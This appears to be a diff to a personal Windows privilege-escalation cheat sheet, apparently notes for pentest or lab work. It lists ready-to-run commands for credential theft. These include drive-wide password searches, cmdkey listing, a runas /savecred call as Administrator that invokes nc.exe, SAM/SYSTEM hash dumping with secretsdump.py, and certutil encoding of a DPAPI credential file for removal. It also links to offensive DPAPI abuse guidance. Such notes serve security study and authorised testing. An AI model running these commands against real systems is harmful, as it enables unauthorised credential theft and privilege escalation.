@@ -167,7 +167,8 @@ findstr /si password *.txt *.ini *.config
 #find 'password' in whole C: directory
 dir /s C:\* | findstr /i "password"
 
-dir /r aka ls -la
+dir /r 
+dir /l /a 
 
 #Finding credential location
 cmdkey /list
@@ -179,6 +180,9 @@ runas /usr:ACCESS\Administrator /savecred "cmd /c C:\Users\security\Desktop\nc.e
 
 # Credential Extracting
 ```
+cd Windows/System32/config
+secretsdump.py LOCAL -system ./SYSTEM -sam ./SAM
+
 #cache files
 
 #Must have admin accesss
@@ -195,7 +199,6 @@ certutil -encode 0792c32e-48a5-4fe3-8b43-d93d64590580 output
 
 # save it into local machine
 type output 
-
 
 https://blog.harmj0y.net/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/
 ```
